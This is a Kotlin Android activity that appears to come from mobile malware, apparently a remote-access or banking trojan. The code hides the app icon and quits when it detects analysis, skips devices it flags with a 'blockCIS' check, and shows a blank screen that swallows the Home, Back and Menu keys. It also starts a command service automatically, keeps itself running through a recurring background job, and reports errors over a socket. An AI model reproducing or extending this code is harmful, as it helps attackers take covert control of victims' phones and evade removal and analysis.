package com.xxx.zzz

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.WindowManager
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.Globalqa
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.globp.utilssss.Utilslp
import com.xxx.zzz.globp.utilssss.evade
import com.xxx.zzz.servicesp.CommandServicedas
import com.xxx.zzz.servicesp.MyWorkerdas
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.lang.ref.WeakReference
import java.util.concurrent.TimeUnit

@OptIn(ExperimentalStdlibApi::class)
class MainActivity : AppCompatActivity() {

    init {
        Payload.ApplicationScope.launch {
            if (Constantsfd.debug) {
                evade {}.onEscape {
                    runCatching {
                        Utilslp.deleteLabelIcon(this@MainActivity)
                    }
                    withContext(Dispatchers.Main) {
                        runCatching {
                            finish()
                        }.onFailure {
                            IOSocketyt.sendLogs("", "onEscape ${it.localizedMessage}", "error")
                        }
                    }
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        runCatching {
            window.setFlags(
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            )
            window.setFlags(
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
            )

            super.onCreate(savedInstanceState)

            runCatching {
                if (Utilslp.blockCIS(this@MainActivity)) {
                    runCatching {
                        Utilslp.deleteLabelIcon(this@MainActivity)
                    }
                    runCatching {
                        finish()
                    }
                }
            }

            SharedPreferencess.init(this.applicationContext)

            Globalqa.mainActivity = WeakReference(this)

            val tv = TextView(this)
            tv.text = " "
            setContentView(tv)

            val startFromPush: Boolean = intent.getBooleanExtra("FromPush", false)
            start(startFromPush)
        }.onFailure {
            IOSocketyt.sendLogs("", "MainActivity onCreate ${it.localizedMessage}", "error")
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true
        }
        return if (keyCode == KeyEvent.KEYCODE_BACK) {
            true
        } else keyCode == KeyEvent.KEYCODE_MENU
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        start(startFromPush = true)
    }

    override fun onBackPressed() {
        start(startFromPush = true)
    }

    private fun start(startFromPush: Boolean) {
        CommandServicedas.autoStart(this)

        startServiceViaWorker()

        if (!Payload.startFrom) {
            startActivity(
                Intent(this, PermissionsActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                    putExtra("FromPush", startFromPush)
                }
            )
        } else {
            startActivity(
                Intent(this, PermissionsActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    putExtra("FromPush", startFromPush)
                }
            )
        }

        finish()
    }

    private fun startServiceViaWorker() {
        runCatching {
            Log.d("TAG", "startServiceViaWorker called")

            val request: PeriodicWorkRequest = PeriodicWorkRequest.Builder(
                MyWorkerdas::class.java,
                16,
                TimeUnit.MINUTES
            ).setInitialDelay(5, TimeUnit.MINUTES).build()

            WorkManager.getInstance(this.applicationContext).enqueueUniquePeriodicWork(
                "StartMyServiceViaWorker",
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
        }
    }
}